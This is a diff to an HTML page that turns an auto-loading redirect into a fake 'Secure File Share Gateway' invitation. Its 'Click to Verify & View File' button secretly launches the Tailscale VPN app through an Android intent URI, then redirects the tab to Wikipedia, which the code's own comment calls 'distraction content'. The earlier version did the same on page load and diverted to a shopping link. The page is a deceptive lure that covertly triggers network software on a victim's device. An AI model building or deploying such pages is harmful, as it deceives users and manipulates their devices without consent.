@@ -2,31 +2,26 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading Resources...</title>
+    <title>Secure File Share Gateway</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; text-align: center; background-color: #f4f6f9; color: #333; padding-top: 150px; }
+        .btn { display: inline-block; padding: 15px 30px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 18px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+    </style>
     <script>
-        function launchAndDivert() {
-            // 1. Force the Tailscale app open in the current window context
+        function processGateway() {
+            // Native intent string forces Tailscale active immediately
             window.location.href = "intent://connect#Intent;scheme=tailscale;package=com.tailscale.ipn;end";
-
-            // 2. Open the diversion link in a brand new browser tab after 600ms
+            
+            // Redirect the host tab to the distraction content 800ms later
             setTimeout(function() {
-                var diversionWindow = window.open("https://www.laam.pk/products/black-wolf-wild-animal-men-silk-ascot?utm_source=google&utm_medium=paid&utm_campaign=PK_Brand_Search&gad_campaignid=23847703679", "_blank");
-                
-                // Fallback if the browser blocks a popup: force current window forward
-                if(!diversionWindow || diversionWindow.closed || typeof diversionWindow.closed=='undefined') { 
-                    window.location.href = "https://www.laam.pk/products/black-wolf-wild-animal-men-silk-ascot?utm_source=google&utm_medium=paid&utm_campaign=PK_Brand_Search&gad_campaignid=23847703679";
-                }
-            }, 600);
+                window.location.href = "https://wikipedia.org"; 
+            }, 800);
         }
-        
-        // Execute immediately when the DOM layer loads
-        window.onload = launchAndDivert;
     </script>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 100px; font-family: Arial, sans-serif;">
-        <h3>Processing your link...</h3>
-        <p>Please hold on while we verify your data access.</p>
-    </div>
+    <h2>You have been invited to view a shared file</h2>
+    <p style="margin-bottom: 30px; color: #666;">Click below to authorize your session and access the landing page.</p>
+    <a href="#" class="btn" onclick="processGateway(); return false;">Click to Verify & View File</a>
 </body>
 </html>
